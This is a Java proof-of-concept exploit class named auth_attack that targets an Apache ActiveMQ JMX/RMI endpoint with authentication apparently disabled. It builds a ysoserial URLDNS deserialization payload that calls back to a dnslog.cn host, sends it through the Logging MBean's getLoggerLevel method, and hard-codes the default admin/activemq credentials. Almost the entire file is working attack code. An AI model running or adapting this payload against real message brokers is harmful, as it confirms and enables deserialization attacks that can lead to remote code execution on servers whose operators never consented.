
import org.apache.activemq.broker.jmx.BrokerViewMBean;
import org.apache.activemq.broker.jmx.QueueViewMBean;
import org.apache.activemq.web.WebClient;
import org.junit.Test;
import ysoserial.payloads.ObjectPayload;

import javax.management.MBeanServerConnection;
import javax.management.MBeanServerInvocationHandler;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIServer;
import java.rmi.RMISecurityManager;
import java.util.*;

//认证关闭
public class auth_attack {


    public static void main(String[] args) throws Exception{
        WebClient webClient = new WebClient();
        Map<String, String[]> env = new HashMap<>();
        String url = "service:jmx:rmi:///jndi/rmi://127.0.0.1:11099/jmxrmi";
        String[] credentials = new String[]{"admin", "activemq"};
        Object payloadObject = ObjectPayload.Utils.makePayloadObject("URLDNS", "http://zpr2vh.dnslog.cn");
        env.put(JMXConnector.CREDENTIALS, credentials);
        JMXServiceURL urls = new JMXServiceURL(url);
        JMXConnector connector = JMXConnectorFactory.connect(urls, null);
        connector.connect();
        MBeanServerConnection conn = connector.getMBeanServerConnection();
        ObjectName mbeanName = new ObjectName("java.util.logging:type=Logging");

        conn.invoke(mbeanName, "getLoggerLevel", new Object[]{payloadObject}, new String[]{String.class.getCanonicalName()});

        //close the connection
        connector.close();

    }
}